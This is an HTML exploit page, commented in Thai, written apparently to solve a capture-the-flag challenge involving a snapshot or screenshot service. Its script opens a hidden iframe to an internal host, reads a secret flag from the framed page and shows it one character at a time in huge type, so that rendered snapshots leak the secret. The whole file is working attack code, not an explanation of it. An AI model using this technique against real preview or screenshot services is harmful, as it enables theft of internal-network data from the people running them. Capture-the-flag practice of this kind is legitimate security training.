<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CTF Snapshot Exploit</title>
    <style>
        /* * สไตล์ชีตสำหรับทำให้หน้าเว็บแสดงผลตัวอักษรขนาดใหญ่มาก
         * เพื่อให้สามารถมองเห็นได้แม้ภาพจะเบลอ
         */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: white; /* ตั้งพื้นหลังเป็นสีขาวให้เหมือนกับเป้าหมาย */
            overflow: hidden;
        }

        #char-display {
            font-family: 'Courier New', Courier, monospace; /* ใช้ฟอนต์แบบ Monospace เพื่อให้ตัวอักษรชัดเจน */
            font-size: 80vw; /* ตั้งขนาดฟอนต์ให้ใหญ่เกือบเต็มจอ */
            font-weight: bold;
            color: black; /* ตั้งสีตัวอักษรเป็นสีดำเพื่อให้มองเห็นได้ */
            text-align: center;
        }
    </style>
</head>
<body>
    <!-- Element ที่จะใช้แสดงผลตัวอักษรทีละตัว -->
    <div id="char-display">?</div>

    <script>
        // ฟังก์ชันหลักสำหรับเริ่มกระบวนการ Exploit
        function runExploit() {
            try {
                // 1. ดึงค่า index ของตัวอักษรที่ต้องการแสดงผลจาก URL (เช่น ?char=0)
                const urlParams = new URLSearchParams(window.location.search);
                const charIndex = parseInt(urlParams.get('char') || '0', 10);

                // 2. สร้าง iframe แบบซ่อน เพื่อใช้โหลดหน้าเว็บเป้าหมาย
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none'; // ซ่อน iframe ไม่ให้แสดงผล
                iframe.src = 'http://snapshot-internal/'; // URL ของเว็บภายในที่ต้องการดึง Flag

                // 3. ตั้งค่า event handler `onload` ซึ่งจะทำงานเมื่อ iframe โหลดเสร็จ
                iframe.onload = () => {
                    try {
                        // 4. เข้าถึง Document ภายใน iframe
                        const innerDoc = iframe.contentWindow.document;
                        
                        // 5. ค้นหา element ที่มี Flag อยู่
                        // จากโค้ดตัวอย่าง Flag อยู่ใน <p> ตัวที่สอง ภายใน <span>
                        const flagSpan = innerDoc.querySelector('p:nth-child(2) span');
                        
                        if (flagSpan) {
                            // 6. ดึงข้อความและทำความสะอาด
                            // จาก `F|L|A|G...` ให้กลายเป็น `FLAG...`
                            const flagText = flagSpan.textContent || '';
                            const cleanFlag = flagText.replace(/\|/g, '');
                            
                            // 7. ดึงตัวอักษรตาม index ที่ระบุมาใน URL
                            if (charIndex < cleanFlag.length) {
                                const charToShow = cleanFlag[charIndex];
                                // 8. แสดงผลตัวอักษรนั้นใน div #char-display
                                document.getElementById('char-display').textContent = charToShow;
                            } else {
                                // ถ้า index เกินความยาวของ Flag ให้แสดงเครื่องหมาย _
                                document.getElementById('char-display').textContent = '_';
                            }
                        } else {
                            // หากไม่พบ element ของ Flag
                            document.getElementById('char-display').textContent = 'E'; // E = Error
                        }
                    } catch (e) {
                        // จัดการ Error กรณีเข้าถึง iframe ไม่ได้ (เช่น Cross-Origin)
                        // ในโจทย์ CTF บางข้ออาจจะไม่มีปัญหานี้
                        document.getElementById('char-display').textContent = 'X'; // X = Exception
                        console.error('Error accessing iframe content:', e);
                    } finally {
                        // ลบ iframe ออกไปหลังจากทำงานเสร็จ
                        document.body.removeChild(iframe);
                    }
                };

                // จัดการ Error กรณี iframe โหลดไม่สำเร็จ
                iframe.onerror = () => {
                     document.getElementById('char-display').textContent = 'F'; // F = Failed to load
                     console.error('Failed to load iframe.');
                     document.body.removeChild(iframe);
                };

                // 9. เพิ่ม iframe เข้าไปใน body เพื่อเริ่มโหลดหน้าเว็บเป้าหมาย
                document.body.appendChild(iframe);

            } catch (e) {
                document.getElementById('char-display').textContent = 'G'; // G = Global Error
                console.error('Global script error:', e);
            }
        }

        // เริ่มทำงานเมื่อหน้าเว็บโหลดเสร็จ
        window.onload = runExploit;
    </script>
</body>
</html>
